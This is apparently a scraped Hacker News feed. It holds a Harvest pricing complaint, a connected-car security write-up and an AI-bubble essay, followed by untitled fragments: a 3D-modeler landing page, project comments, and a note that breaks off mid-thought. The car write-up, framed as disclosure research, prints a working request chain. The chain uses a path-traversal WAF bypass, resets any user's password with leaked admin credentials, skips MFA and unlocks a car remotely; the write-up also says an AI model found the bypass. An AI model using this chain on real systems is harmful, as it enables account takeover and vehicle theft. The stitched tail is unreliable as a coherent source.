item.title: RIP, Harvest (321 pts)
item.description:
URL: https://aphyr.com/posts/427-rip-harvest, See on Hacker News

I’ve been a self-employed contractor for about a decade now, and I’m bummed about Harvest.

Harvest was a time-tracking and invoicing service. You’d track how many hours or weeks you spent on a project, put together an invoice, email it to the client, and close it out when they paid. There was a little Stripe integration for accepting credit and ACH payments on the invoice web view. A historical chart of total billed/paid amounts over time, and a table of invoices. Harvest was exactly what you want from small-business software: it solved a well-defined problem with a reliable, simple interface, and did so at a reasonable monthly price. They managed to avoid scope creep and never tried to become an accounting platform, or a blockchain for washing machines.1 I loved Harvest and raved about it to every self-employed person I met.

Back in 2025 Harvest got bought out by Bending Spoons, the company that gutted Vimeo. I was worried they might ruin it, but was busy with other things and didn’t have time to look for new invoicing software.

Long story short, they raised my price from $13.32 to $133.98 per month by moving everyone to a new “enterprise” plan and “unlimited” usage billing model, which is, as far as I can tell, exactly what I had before. There’s also a “flex” plan which costs $12.65 per month… but that plan now skims an additional 2% on top of the usual ~3% card transaction fees. To be clear, that 3% pays for the whole credit card network, plus all the people working at Stripe and Mastercard, plus the financial risk of chargebacks and fraud, etc. Harvest isn’t doing any of that work. I don’t know about you, but I don’t think I need to spend 2% of my gross revenue to send a couple PDFs a month and wrap a Stripe web form.

I wrote to Harvest about this, and discovered that they don’t read customer emails any more. Instead they have a Large Language Model repeatedly vomit thousands of words at you. I’m no stranger to enshittification, but man, I did not anticipate the speed at which Bending Spoons would drive a perfectly good company into the ground.

Time to find a new invoicing service, I guess. Maybe bookkeeping too—Intuit’s Quickbooks Online seems to have completely jumped the shark. Any of y’all freelancers have a system you like?

item.title: Unlocking any car from X brand in most of the world (299 pts)
item.description:
URL: https://shubs.io/unlocking-any-car-from-x-brand-in-most-of-the-world/, See on Hacker News

November 7 2026

I've always had a soft spot for this particular car brand. Our family has owned a few of them over the years, and they've served us incredibly well. In 2023, I bought a new four wheel drive/SUV from them, and it was the first time I had access to their connected car platform.

Having looked at platforms like this before (previous works), I was sceptical about how secure they really were. I suspected there was something there, but life kept getting in the way of actually looking. This July, I collaborated with Sam Curry to take a look at the security of a major automaker's connected car systems. Throughout this post, I'll refer to them simply as "the automaker".

When you typically think of car hacking, it's often easy to jump into the hardware side of things, but my background sits pretty squarely in compromising internet-facing web applications and infrastructure. Regardless of all the hardware bits and bobs, it all connects back to some service that, by design, has to be reachable from the internet.

The journey started with a simple question: what infrastructure does the app talk to when I remotely unlock my car? To work this out, I downloaded the APK and decompiled it, eventually reconstructing the API requests that were being made.

Going through the code, the primary point of contact seemed to be assets under *.redacted-telematics.com.au:

dartExecutor.executeDartEntrypoint(createDefault, CollectionsKt.r(gson.toJson(new GlobalConfigParams(false, g11, com.redacted.app.xcapp.a.f69866f, "X", str)), new Gson().toJson(new ApiConfig("https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au" ...

Almost every part of the consumer application called back to redacted-telematics.com.au. What else existed under this domain?

Running connected car infrastructure can be quite complex, and managing it requires a mix of admin tools, staging, dev, and QA environments, to make sure that customers get a clean experience. Whether all of that should be sitting on the public internet, available to anyone willing to do some basic reconnaissance, is a different story.

One asset caught my attention more than the others. admintool.redacted-telematics.com.au returned a page titled TEST HARNESS. Who can resist a subdomain with admintool in it?

Visiting this subdomain presented a very plain and grey login screen, which didn't exactly ooze quality, given it presented a logout button before we'd logged in.

I love that most single-page applications ship their entire JavaScript bundle even when all they need to render is a login page. Sure, some more modern frameworks split out JavaScript files so that they only serve what is necessary, but in this case, we could comb through the large JavaScript bundle to understand what this "admin tool" actually let you do.

Turns out this admin tool let you do quite a lot. It had a rich API that let the automaker's employees interact with customer accounts and production vehicles with very few restrictions. Reconstructing the requests, we found that a lot of these APIs needed no authentication beyond the hardcoded API keys sitting in the JavaScript bundle.

For example, we could look up user accounts by email address:

But that's just not good enough. If we want to unlock any of their cars from just knowing the number plate, we're going to need to do better than that.

In Australia, a number plate gets you the VIN (vehicle identification number) fairly easily through state-based registration lookup sites.

This isn't really a security flaw. There are plenty of legitimate reasons to want a VIN, like checking a car's true repair and insurance history before buying second-hand. If we could go from VIN to a subscriber or email, we'd complete the chain.

Fortunately, there was an API that let you do exactly that:

With the subscriber GUID, you could pull the full account details (including the user's email via the /v1/account endpoint) like so:

Well, I guess we have the first part of our chain sorted. Plate -> VIN -> Subscriber GUID -> User Account PII (email) registered on the automaker's identity platform (ForgeRock OpenIDM).

Now, how do we send commands to any car we want? Surely this admin tool would let us do that? Unfortunately, no. It let us provision features to a car, add ourselves to a user's account as a secondary user, and even generate remote access codes. But for all that functionality, none of it actually got us remote control of a vehicle.

The identity platform

Sam and I then spent two weeks digging into how the automaker manages their central identity system: the software they use, the way commands are issued, and how consumers authenticate.

When a user goes through the authentication flow for the automaker's mobile app, requests are made to login.redacted-identity.com.au, and after going through an MFA flow, a consumer auth token is finally issued. This auth token is then used for subsequent requests to api.redacted-telematics.com.au (both REST APIs and GraphQL). Once you have that auth token, it's pretty much game over. You can control a user's car (remote unlock/lock, horns, engine, etc).

So if we could mint a token for any user, we'd finally be able to control anyone's connected car. This is the angle we went for.

The automaker is a heavy user of ForgeRock's identity software (OpenAM/OpenIDM). This is the cornerstone of their authentication mechanisms. Pulling the subdomains for *.redacted-identity.com.au, we quickly found their OpenIDM instance at openidm.redacted-identity.com.au. This is the system that manages every identity registered on the automaker's connected car platform.

This all clicked together when we were combing through the JavaScript files under *.redacted-telematics.com.au and we came across an absolutely cursed vendor JavaScript bundle that embedded admin credentials for OpenIDM 😱:

Even though these admin credentials were meant to be for their staging environment, given the hygiene we'd seen so far, we were pretty sure they'd work in production too.

Fighting the WAF

Looking closer at OpenIDM, we couldn't tell whether the automaker knew how fragile it was. One thing was obvious though: they'd invested heavily in WAF rules to block access to the sensitive APIs that ForgeRock typically lets you call via /openidm/*.

Even with the origin IP, any request to /openidm/ came straight back as an Nginx WAF block. Someone had put real effort into hardening these assets (despite them being externally accessible).

Fair enough, and we respect the hardening. But that much WAF investment usually means bandaids over something known to be bad. They probably understood how bad it was to have this asset exposed at all, and some business case kept it there anyway.

I'm not sure a WAF rule has ever stopped us when we're motivated enough, so we invested days into finding a way out of these protections, using our trusty path traversal tricks. How hard could it be?

Validating the admin credentials we found inside the JavaScript bundle was not that tough. The Australian OpenIDM instance had a few paths whitelisted like /XUI/ and /UI/, and path traversal characters were not blocked, so something as simple as /XUI/..%2fopenidm/endpoint seemed to at least partially work:

But it can never be as simple as that, right? The path traversal still didn't get us to the endpoints under /openidm/, thanks to quirks in how OpenIDM handles routing. Every endpoint would error out like so:

In OpenIDM's world, there were no servlets (or resources) registered against paths that included the path traversal within them. So it would just error out, even though it issued us an admin JWT.

We were incredibly annoyed by this. A simple quirk in routing mechanisms (probably not even designed as a security consideration) was blocking the full attack chain from working. We sat frustrated for a few days, and we thought that the path traversal angle just wasn't going to work. We did find a few other endpoints (user upload, for example) that looked like they might work, but we hit another quirk, a servlet path check, that prevented us from using them meaningfully.

All of this made us ask a different question: why expose these OpenIDM instances externally at all? Surely there had to be some legitimate use case for these assets to be exposed on the internet? We went back to the different JavaScript bundles we had collected from their assets and searched them for communications to OpenIDM. We turned to the decompiled Android application and found the following:

These were clearly endpoints within their OpenIDM asset that were contactable from the Android app. So, maybe these were accessible without the WAF getting in the way?

  • /openidm/endpoint/aaa -> 403 WAF blocked
  • /openidm/endpoint/pinService -> 404, no WAF block

Interesting!

What other custom endpoints existed? With some very light brute forcing and guessing, we quickly found a getUser endpoint. Guessing at parameters, we found it accepted mail, guid, and phone. Combined with our admin credentials, what did this really let us do?

The response came back with the password hash, PIN code hash, mobile push tokens, and PII including mobile numbers and full names. There was no WAF block on this endpoint, so no path traversal was needed and the correct servlet responded.

Don't get me wrong, this was already pretty impactful. But the passwords were hashed with PBKDF2-SHA512, and needing time on a hash cracking rig for every unlock, with no guarantee of success, felt a bit lacklustre.

Back to the drawing board. How could we access the /openidm/managed/user servlet with our path traversal, and still have the path be recognised by OpenIDM? We grabbed the OpenIDM source closest to the version we were testing against and let GPT 5.6 Sol Ultra spend a good six hours on it.

It succeeded. Even though Sam and I had both spent time trying to manually bypass this juvenile restriction ourselves, we hadn't tried every possible combination.

When Sam and I tried /XUI%2f..%2fopenidm/, we got a hard 403, and being human, we assumed that applied to every prefix. What GPT 5.6 found was that /static%2f..%2fopenidm/ wasn't covered by the WAF at all, and it gave us the OpenIDM APIs without the servlet confusion issue.

Taking over accounts

With this bypass, taking over an account became trivial. We could PATCH a new password for any user profile:

PATCH /static%2f..%2fopenidm/managed/user/f7ba554REDACTED HTTP/1.1
Host: openidm.redacted-identity.com.au
X-OpenIDM-Username: idmadmin
X-OpenIDM-Password: REDACTED
X-OpenIDM-NoSession: true
Content-Type: application/json
If-Match: "0000000abc123..."
Cache-Control: no-store
Accept: application/json

[{"operation":"replace","field":"/password","value":"Testing123!"}]

Which responded with:

> HTTP/1.1 200 OK
> {"_id":"f7ba554REDACTED","_rev":"0000000def456..."}

OK, so we could overwrite the password for any user. But what about multi-factor authentication?

Skipping MFA

Well, the automaker's Australian environment had one more misconfiguration: the multi-factor step could be skipped entirely. First, we requested an authentication token from login.redacted-identity.com.au with a Resource Owner Password Credentials grant, which returned a clean id_token we could swap for something usable in the consumer app:

POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded

grant_type=password&[email protected]&password=Testing123!&client_id=REDACTED_PORTAL&client_secret=REDACTED

> HTTP/1.1 200 OK
> {
>   "access_token": "...",
>   "id_token": "eyJ0eXAiOiJKV1Qi...",
>   "token_type": "Bearer",
>   "expires_in": 3599
> }

We took that and moved on to step two, exchanging the first token for a session:

POST /json/realms/REDACTED/authenticate?authIndexType=service&authIndexValue=IDTokenROPC HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/json
Accept: application/json
Accept-API-Version: resource=2.0, protocol=1.0
idtoken: eyJ0eXAiOiJKV1Qi...

> HTTP/1.1 200 OK
> {
>   "tokenId": "AQIC5wM2LY4Sfcy...*",
>   "successUrl": "/openam/console",
>   "realm": "/REDACTED"
> }

Lastly, we performed the token exchange for a mobile app access token:

POST /oauth2/realms/root/realms/REDACTED/authorize HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
x-fr-version: 2025.05.05
Authorization: Basic <REDACTED>
iPlanetDirectoryPro: AQIC5wM2LY4Sfcy...*
Cookie: iPlanetDirectoryPro=AQIC5wM2LY4Sfcy...*

client_id=REDACTED_APP&redirect_uri=com.redacted.app:/oauth2Callback&scope=openid%20profile%20write&response_type=code&state=<state>&code_challenge=<S256_challenge>&code_challenge_method=S256&decision=allow&csrf=AQIC5wM2LY4Sfcy...*

> HTTP/1.1 302 Found
> Location: com.redacted.app:/oauth2Callback?code=<authorization_code>&state=<state>

POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
Authorization: Basic <REDACTED>

grant_type=authorization_code&code=<authorization_code>&redirect_uri=com.redacted.app:/oauth2Callback&client_id=REDACTED_APP&code_verifier=<pkce_verifier>

> HTTP/1.1 200 OK
> {
>   "access_token": "<app_access_token>",
>   "refresh_token": "...",
>   "token_type": "Bearer",
>   "scope": "openid profile write",
>   "expires_in": 3599
> }

It's super convoluted, I know. OAuth is annoyingly hard sometimes. But these steps let us bypass multi-factor authentication for any user of the automaker's connected car app.

Unlocking the car

At this point, we were so damn close to unlocking any of the automaker's cars in Australia. All that was left was issuing the command API requests with the app token we could now mint for anyone.

POST /v1/remote/route/command HTTP/1.1
Host: api.redacted-telematics.com.au
Authorization: Bearer <app_access_token>
X-API-KEY: REDACTED
X-GUID: f7ba554REDACTED
X-BRAND: REDACTED
X-APPBRAND: REDACTED
X-CHANNEL: REDACTED
X-LOCALE: en-AU
X-APPVERSION: REDACTED
X-OSNAME: Android
X-OSVERSION: 14
X-DEVICE-TIMEZONE: AEST
X-CORRELATIONID: 6f1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8
X-GENERATION: REDACTED
VIN: XXXXXXXXXXXXXXXXX
Content-Type: application/json
Accept: application/json
User-Agent: okhttp/4.12.0

{"command": "door-unlock", "autoFixPopup": false, "beepCount": null}

And magic. The doors unlocked.

We obviously did all of this on cars we explicitly owned or had permission to interact with.

But let's take a step back and think about what we achieved here. We could send commands to any of the automaker's vehicles in Australia, across both of their brands, by only knowing the number plate of the vehicle. The final chain looked like this:

Plate -> VIN -> Subscriber GUID -> OpenIDM admin credentials in JS vendor bundle -> Path traversal to bypass the WAF -> MFA bypass via ROPC flow -> Minting a consumer app token -> Remote command API.

At 12AM, when the full chain finally came together, I took a short video of the script in action. It's not polished, but it still felt magical seeing it all work. I definitely live for hard challenges like these.

You might be wondering: Shubs, you said any of their cars in the world. This only covers Australia. What gives?

There's a much more complex chain that Sam and I worked on together, which he's published on his blog here. It required a lot more work than the steps we took for Australia, as the automaker had spent much more time securing the US, Canadian, and European OpenIDM environments.

At the end of the day, with both writeups combined, we could send remote commands such as unlocking and turning the engines on, for any of the automaker's vehicles in Australia, the United States, and Canada.

item.title: I'm not convinced the AI bubble exists (234 pts)
item.description:
URL: https://matteoraso.github.io/im-not-convinced-the-ai-bubble-exists.html#im-not-convinced-the-ai-bubble-exists, See on Hacker News

The AI bubble is a speculative concept that the AI industry is extremely over-valued. If true, the value of most companies involved in AI (several of whom are worth well over a trillion dollars) will collapse, devastating the entire economy. If you check any online discussion about the financial situation of the AI industry, it's essentially taken for granted that the bubble exists and is going to pop any day now. I don't think that this is a reasonable assumption, though. Nobody can see the future, but I think that there's a pretty realistic chance that the meteoritic growth of AI companies in the past few years is justified, and that they have even more room for growth.

Expenses Are Sky-High, But Constrained

To say that AI companies are spending an absurd amount of money is an understatement. The debt and spending commitments for AI companies are handled through complex vehicles that make it difficult to tell exactly how much their expenses actually are (a serious problem, and one of the most salient points in favour of AI being a bubble), but they've committed to spending at least 3 trillion dollars so far. It's also been estimated that AI companies have already spent 1.9 trillion, bringing the overall expense of the AI industry to around 5 trillion dollars. This is unprecedented levels of investment, and AI just can't be profitable if this level of spending is maintained. However, there's no reason for why this level of spending has to be maintained in the first place. The reason why AI companies are spending so much money is to rollout data centres to run the AI in the first place. These expenses are one-off purchases, not regular operating expenses. Once all the data centres are built, AI spending is going to plummet.

Outside of these expenses, AI doesn't cost that much to run. We don't have the full numbers for the entire industry here, but Anthropic's S-1 filing says that they make $2.08 for every $1 of compute. In other words, once you ignore the cost of building infrastructure, AI is very profitable. Crucially, the S-1 filing indicates that Anthropic has started to make more than their compute and infrastructure investments combined, which cuts against the idea that the cost of building data centres is inherently unsustainable. In a pinch, AI companies can also cut costs by no longer allowing people to use their products for free and temporarily suspending expensive AI research. This can be implemented instantly, whereas other kinds of expenses like leases and spending commitments are a lot harder to cut.

The only serious long-term expenses to contend with here is the massive amount of debt that's been taken out to pay for these data centres in the first place. Like I said before, it's hard to really figure out these commitments because of the complex way that they're issued, but we can do some back of the envelope math. If the AI industry has to pay off 5 trillion dollars over the course of 20 years, that's 250 billion dollars a year. For context, Alphabet (parent company of Google and Youtube) reported earning almost 162 billion dollars of revenue just in 2019. Adjusted for inflation, that's an even more impressive 213 billion dollars. Because this is very rough math, the total needed revenue might come in to well over 250 billion dollars a year, but the point stands. Even though this is an enormous expense, paying it off isn't unthinkable with the data we have so far. Some of the debt is in convertible notes as well, which can be repaid through shares instead of cash. In the first 6 months of 2026, Anthropic has recorded 72 billion dollars of loss in the form of shares that are due to lenders. The cost is only so high because the valuation has skyrocketed to an estimated 1 trillion dollars, which means that Anthropic has more than enough equity to make lenders whole.

Profits Can Grow, By A Lot

In their S-1 filing, Anthropic records their revenue going from 41 million in 2023, 386 million in 2024, 4.585 billion in 2025, and 16.3 billion in the first 6 months of 2026. That's an insane increase in revenue, and it's safe to assume that other major AI companies like OpenAI are also seeing similar increases as well. At some point, the rate of increase has to level off, but that doesn't have to happen anytime soon. When I look at the current capacity of AI, it really feels like there's so much potential for frontier models to be used that just aren't being applied yet. Most (or maybe even all) programmers and mathematicians are worse at their respective field than an AI swarm equipped with a good harness, and a good deal more expensive as well. AI can't replace lawyers and doctors, but they can automate their paperwork and free up time for them to do other things. Outside of generative AI, self-driving cars are becoming a reality, with some evidence to suggest that they're even better than human drivers. AI adoption takes time, but there's no reason to think that AI usage isn't going to massively skyrocket, even if AI doesn't get any better than it is today (and it certainly will get better). In other words, there's massive unmet demand for AI companies to profit from.

There's a weird contradiction you see from AI skeptics where they're afraid of how AI will change the world, but also seem convinced that AI will only ever produce slop that nobody would ever pay money for. You can't really have it both ways here. It's completely valid to be afraid of AI taking your job, but money is going to change hands when that happens. I don't know exactly what the future will look like or how long it'll take for mass AI adoption to really happen, but when I imagine how AI will change the world, it's hard for me to see AI consumption not being 10x what it is now.

Google Has No Moat, But Neither Does McDonald's

In 2023, a memo from Google called "We Have No Moat, And Neither Does OpenAI" was leaked, which outlined how the open source community was keeping pace with AI labs. More broadly, the memo rejected the idea that any company can really have a durable advantage when it comes to AI development. It would certainly be profitable if they could, but there's already so much information and research out there that nobody can ever hope for their frontier models to stay on the frontier for long. That means that there will never be a point where a company wins the AI wars, just nonstop fighting as each company in the industry tries to one-up the others. You know what other company didn't have a moat and found itself in a war to sell a product that its competitors could easily copy? Popeyes during the chicken sandwich war. I know that sounds goofy, but from a business perspective, it's remarkably similar. None of the restaurants involved in the chicken sandwich war had an enduring competitive advantage over any of the others, and all of them had to deal with potential customers choosing to just cookat home instead, but it was still highly profitable for everybody involved. Simply saying that a company doesn't have a moat isn't enough to say that the company can't make money.

In theory, an AI company has to be worried about their users switching over to a competitor or using an open source model instead. In practice, this isn't a major concern. For starters, the average person isn't going to use a locally hosted model, ever. I know that it's a common hobby in tech circles, but normal users don't want to have to deal with the hassle or expense of setting up something that's going to perform at most the exact same as ChatGPT. That means that in principle, there's only going to be a few models that the vast majority of people will ever use. People can theoretically switch from model to model, but people tend to settle in with a product and develop brand loyalty. For example, I pretty much only use ChatGPT, not because I have any really reason to, but because it was the first LLM that I ever used. This partially offsets the risk of losing customers to a different product. Another way that companies can make money without having a moat is through institutional lock-in. Once a large corporation has integrated a particular AI into their day to day operation, transitioning away isn't costless. They may even have contracts agreeing to buy a certain amount of tokens, which binds them to keep using the AI instead of transitioning.

There's Still Plenty Of Capital To Raise

A potential way for a bubble to pop is for the companies involved to run out of capital to spend while they grow, causing them to fail. With the enormous amount of churn and debt that AI companies have, this is a serious risk to consider. Even so, I think that it's premature to worry about these companies failing to raise capital when most of them haven't even had an IPO yet. When SpaceX (which is partially an AI company, despite the name) went public, they raised more than 80 billion dollars. Besides that, many AI companies haven't issued public debt yet, which is a major way to get loans if private lenders decide that they don't want to put more of their capital into AI. The ones that have issued public debt, like Alphabet and Meta, have excellent bond ratings. If they need more capital, they won't struggle to find people to give them a loan.

Of course, investors aren't the only way to get capital. Once AI companies become profitable (as they already seem to be), they can use those profits to fund growth and pay off debts. The idea that AI companies are forced to constantly look for new investors to keep their doors open is probably a few months antiquated. From how it looks from Anthropic's S-1, the AI world may be past the horizon when it came to taking risky bets and can now focus on reaping the rewards.

The AI Industry Doesn't Look Like Any Bubble We've Seen Before

When a bubble happens, it's usually preceded by the companies involved reaching obviously inflated evaluations, which makes the burst obvious in hindsight. With public AI companies, we don't see that happening. Alphabet, Meta, and NVIDIA are all AI companies that have seen their market capitalization explode over the past few years, but all of them have stable P/E ratios in their 20s. If the increase in their valuations were irrational (or even just in expectation of future growth as opposed to current earnings), you would expect the P/E ratios to go up. Instead, their valuations look exactly what we would expect from a healthy trillion dollar company. When the dot-com bubble happened, it was largely driven by companies that couldn't turn a profit or had P/E ratios in the hundreds. I'm not going to pretend that I'm an expert on financial bubbles, but I've never heard of a bubble where the companies involved had such a modest valuation based on their earnings, even if their earnings (and therefore their evaluations) are enormous.

A potential way that this could be a bubble is if AI proves to be a fad. A lot of this rise in valuations has been because of increased demand for GPUs and data centre utilization, which is downstream of the demand for AI. We might imagine that the AI labs are propped up by an enormous amount of invested capital, and this capital ends up propping up the valuations for companies that make or rent out GPUs. However, this doesn't seem to be happening. Alphabet has a full-stack AI supply chain, where they create ASICs for AI, train their own AI, integrate AI into their products, and rent out compute to customers. Their prospectus helpfully divides their revenue streams into Google Cloud for their rented compute and Google Services, which makes it easy to tell if Alphabet's increased earnings are mostly because of their data centres. The answer is no. Google Cloud revenue is growing more in terms of percentage, but Google Services is growing far more in absolute terms. Specifically, Google Services revenue grew by 37.8 billion dollars for a 12% increase, while Google Cloud revenue grew by 15.5 billion dollars for a 36% increase. Alphabet is definitely benefiting from renting out their data centres, but it's not the main reason why their earnings have skyrocketed. Meta doesn't rent out their data centres at all, but their prospectus also records them having massive increases in their revenue, on the order of an extra 30 billion dollars from 2024 to 2025, and another extra 30 billion from 2023 to 2024. This isn't foolhardy investors throwing money at any company that makes AI, this is real profit from companies that have found ways to monetize AI. Anthropic also seems to be experiencing an exponential growth in their revenue as well, based on their S-1 filing. The only real unknown is OpenAI, which purchases an enormous amount of compute from other companies. It's possible that their finances are terrible, but even if they go under, I'm not convinced that this amounts to a bubble bursting. If anything, it seems more likely that their competitors will just consolidate and fight for more of a market share instead of the collapse triggering a chain reaction that takes the industry down with it.

Conclusion

I didn't write this article as some big takedown of the AI bubble theory. Even with this evidence, there are serious risks to the financial sustainability of the AI industry. Public backlash against data centres are going to make it harder for the infrastructure necessary for the AI revolution to continue, and regulatory barriers may make it harder to develop or deploy new models. Besides that, there's an enormous risk of an autonomous AI hacker causing serious damage, causing public demand for AI to plummet. Also, even after writing out it's possible for AI companies to pay off their debt, I'm still concerned by how much it actually is. It's not good that they're using increasingly complex ways to fund their infrastructure investments, and this gamble can backfire if revenue growth suddenly slows down, which it certainly might. Don't YOLO your life savings on the AI revolution, or at least don't blame me if you lose the shirt off of your back. The reason I wrote this article is because I felt that discussion about AI has become something of an echo chamber, which is never a good way to figure out what's right or wrong. Despite the echo chamber, people's stated beliefs and actual behaviour are wildly divergent. It's one thing to say that AI is a bubble that's going to burst, but where is this investor money coming from if we're all in agreement here? At the end of the day, when people have to put their money where their mouth is, they pull it out of their mouth and use it to buy NVIDIA. They might be wrong to do so, but maybe they're not. Time will tell.

As one final note, I don't think the rhetoric about the AI bubble is really about finances. Conversation about the AI bubble is too widespread for it to be a contrarian position, and too gleeful to be driven by investors' fear. More than anything, I think the supposed AI bubble has become such a large talking point because it represents the hope that things can go back to how they used to be. People are afraid of what's going to happen with AI, and rightfully so. Beyond fear for the future, AI in the present has become uncomfortably common, with AI slop everywhere online and increasingly even IRL. This has all happened so fast, it's easy to forget that ChatGPT came out a little less than 4 years ago. Our world has changed in such a scary and odd way, and while I have a pretty optimistic view of AI overall, I get why people would want it all to go away. So, people wishcast. They tell themselves that this is all a giant bubble, and one day soon, everything will crash down and immediately go back to how it used to be. For better or worse, that's not going to happen. Even if AI turns out to be a bubble, it will be a bubble in the same way that the internet was a bubble, where the underlying technology remains useful. We're only ever going to live in the AI era from this point on, and whatever happens as a result of that, hopefully it will at least be good for the economy.

3D design for
your next woodworking project.

KetchUp is a free, open-source 3D modeling app for woodworking and furniture design. Plan a shelf, table, cabinet, or workbench with exact measurements before you build. Use it on Windows, macOS, Linux, or right in your desktop browser.

Free & open source. No account needed.
Made for a desktop browser and a mouse.

From the first line
to the finer details.

Start with a simple shape. Keep the tools you need close, and your model at the center.

Draw. Pull. Make it yours.

Sketch lines, rectangles, circles, and freehand outlines. Turn faces into forms with Push/Pull, then move, scale, offset, and paint.

Keep your ideas in measure.

Snap to geometry and axes, type exact lengths, and add dimensions. Organize the bigger picture with groups, components, and tags.

Your work, in your hands.

Autosave locally and download portable .ketchup projects. Import SketchUp geometry or export an OBJ to take your model further.

Plan your furniture
before the first cut.

For woodworkers, furniture makers, and DIY builders who want to explore a project in 3D.

Model the pieces

Draw board outlines with rectangles and lines, then use Push/Pull to give them thickness. Move and copy geometry to explore shelves, tables, cabinets, workbenches, and other furniture.

Check dimensions and fit

Enter exact lengths, snap to geometry and axes, and use Tape Measure and Dimensions to inspect your design. Orbit around the assembly to review proportions before taking it to the workshop.

Keep the project organized

Use groups, reusable components, and tags to organize parts. Save a portable .ketchup project locally, import SketchUp geometry, or export OBJ geometry for another 3D workflow.

Start with the browser editor or download the desktop app. Read the user guide for modeling instructions and supported workflows.

Your first shape
is three steps away.

The editor opens with a clean slate.
Here’s a good place to start.

Open the workspace

  1. Draw a rectangle

    Click one corner, then the opposite corner to create your first face.

  2. Give it some depth

    Choose Push/Pull, click the face, move your mouse, and click to finish.

  3. Find a fresh perspective

    Choose Orbit and drag to look around. Scroll to zoom; press F to fit your model.

A few things
before you begin.

What do I need to run it?

A desktop browser with hardware acceleration and WebGPU or WebGL2 support. Use a mouse and keyboard for modeling. You can also run KetchUp as a native Windows, macOS, or Linux app.

Where does my work go?

Your model is autosaved in this browser on this device. Use File → Save to download a .ketchup project you can keep or open again. Clearing browser data can remove autosaved work, so download projects you want to keep. There’s no cloud storage or account to set up.

Can I use my existing models?

Use File → Import/Export to import SketchUp (.skp) geometry or export Wavefront OBJ (.obj). Imports run locally. SketchUp textures, scenes, and some model features aren’t supported; OBJ export includes geometry without materials.

Is KetchUp free?

Yes. KetchUp is open source under the MIT license and written in Rust. Explore the code, read the full guide, or contribute on GitHub.

A blank canvas.
Plenty of possibilities.

Definitely slower than I'd like, but it's probably worth noting there's a few things that make this demo much slower than it needs to be:

1. There's some stuff simply not well optimized internally. Working on these now e.g. there's unnecessary internal hierarchy on all nodes that only needs to exist on a small subset (related to border boxes, overflow etc.)

2. Eager shader compilation. There's some glass and blur shaders that are compiled on load. These really shouldn't be.

3. Godot 4.x on the web is always pretty slow to load. Time of first contentful paint (if you ignore loading screens) is nasty across the board. Godot 4.8 upgraded Emscripten, so there's actually potential to improve this quite a bit since it's now easier to dynamically load WASM (which is what we're doing extensively here). I'm unaware of any work on this upstream though.

4. THE BIG ONE. This demo is a bit of a monolithic beast. It doesn't just include Godot's implementation of React. You can reveal the code for any page in the demo, and edit the code live with an inline text editor. Genuinely bundled in this demo is a full TypeScript 7 implementation (based on Bun's Rust implementation) that type checks and compiles code to JS on the fly, and hot swaps components on the page live.

For the most part, this isn't designed as a performance demonstration, although there is a small section on repaints/relayouts. It's mostly just a demonstration of what's possible with the library.

Realistically, there's also the fact this is React. Its architecture is based on React Fabric (like React Native), so runtime performance should be pretty decent. But frankly, it's never going to be as performant as some alternatives — it's not really the primary goal of the project. I'm considering an alternate SolidJS front-end for improved runtime performance, but that'll do nothing for first load time, unfortunately.

pg-restic – Postgres backups to S3/B2 (or any S3-compatible storage) using restic, in one small Docker container.

It runs pg_dumpall on a cron schedule and streams it straight into a restic repo, so nothing touches local disk. I'm working on Hale, an abstract distributed systems language.

It's a traditional systems language in the sense that you have fine control over how resources are used, but it's abstract in the sense that you have to come to an agreement with the compiler about your intent around the resources, rather than directly declaring the machinery.

It's a distributed language in the sense that there is a higher level structural abstraction in the language that situates computations of the program within a recursive graph structure. Part of that structure incorporates message broker semantics. This gives the compiler a unified view of programs across arbitrary process boundaries. The structural abstractions also enable an effects+formal verification syntax within the language, which allows programmers to codify architectural decisions that are then checked by the compiler.

The compiler itself is infrastructure aware, and the highest layer of functionality it handles is configuring the environment into which applications deploy. The single language handles everything from individual memory allocations to distributed fleet deployments.

The language is close to v1, and I'm currently building a fully distributed inference-as-a-service application with it. Arbitrary hardware/supply matched against arbitrary callers/demand in real time.

I've been working on a voxel game engine called Bonsai for ~10 years.

Probably the most interesting thing about it at the moment is the editor. The world, and most things in it, are represented as collections of SDFs. More accurately, they're density fields, but, potato-tomato. One neat thing about representing the world as SDFs is they've been thoroughly researched and documented by a guy named Inigo Quilez, and they have a lot of nice mathematical properties. For example, you can do a smooth union of arbitrary SDFs to get nice rounded contours where shapes join.

The world generator and editor operate almost entirely on the GPU. The terrain and editor pipeline is a three stage process. The first stage is user-configurable; users write an arbitrary 'shaping' shader in GLSL. The second stage is a fused stage; it does a convolution on the output of the first stage to compute a normal, runs a second user-configurable 'decoration' function, and finally applies edits. Edits are collections of SDFs that are 'compiled' from a graph structure on the CPU into a bytecode, and interpreted in the shader. The last stage runs another convolution to compute the final normal, then packs an occupancy bit, color, and normal down into a 32-bit representation, suitable for transfer back to the CPU. I expect I will expand this to include additional user-level bits for encoding biome type and GPU-driven spawning.

The entire shader pipeline is one fused 'ubershader' .. everything is bound at startup and the shader is dispatched three times, incrementing a 'Stage' uniform on each dispatch. This strategy conceptually makes the driver overhead nearly zero, and the profile agrees.

The final step in the process is giving the CPU a chance to spawn additional entities and structures after generation. This is not completely fleshed out, but the bones are there. The idea is that the results of the GPU work are passed back to the CPU, which can run arbitrary callbacks to spawn additional edits and entities. Once spawning is complete, the result is meshed using a fast binary meshing algorithm and uploaded to the GPU. I keep 16 bits of data per voxel from the GPU work, 1 bit of occupancy, and 15 bits of normal for collision response, which works out to half a megabyte per chunk. At the moment I only keep chunks which contain a piece of the world surface, and discard the rest. Surface chunks are dense, and may be compressed in the future, but keeping this amount of data scales to world sizes greater than 1B voxels cubed, which seems good enough for now.

I've really been enjoying using Codex as a headless remote agent on my home lab. I'll often pull it up from my phone and jam on some little project when inspiration strikes.

I kept bumping into the question of how to give it access to the things it needs without leaving my private keys and other credentials on the server though.

